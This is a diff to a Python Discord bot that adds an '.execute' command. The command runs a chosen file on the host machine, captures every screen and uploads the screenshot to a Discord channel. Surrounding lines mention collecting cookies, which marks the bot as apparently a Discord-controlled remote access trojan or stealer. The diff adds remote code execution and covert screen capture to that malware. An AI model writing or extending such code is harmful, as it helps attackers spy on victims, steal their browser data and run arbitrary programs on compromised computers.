@@ -479,6 +479,28 @@ async def on_message(message):
                 else:
                     reaction_msg = await message.channel.send('``Cookies are being collected. Please be patient...``'); await reaction_msg.add_reaction('🔴')
 
+        elif message.content[:8] == '.execute':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                if message.content == '.execute':
+                    reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
+                else:
+                    if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
+                        try:
+                            os.system('start ' + '/'.join(working_directory) + '/' + message.content[9:])
+                            await asyncio.sleep(1)
+                            ImageGrab.grab(all_screens=True).save('ss.png')
+                            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
+                            os.system('del ss.png')
+                            await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
+                        except:
+                            reaction_msg = await message.channel.send('```❗ Something went wrong...```'); await reaction_msg.add_reaction('🔴')
+                    else:
+                        reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+
         elif expectation == 'onefile':
             split_v1 = str(message.attachments).split('filename=\'')[1]
             filename = str(split_v1).split('\' ')[0]
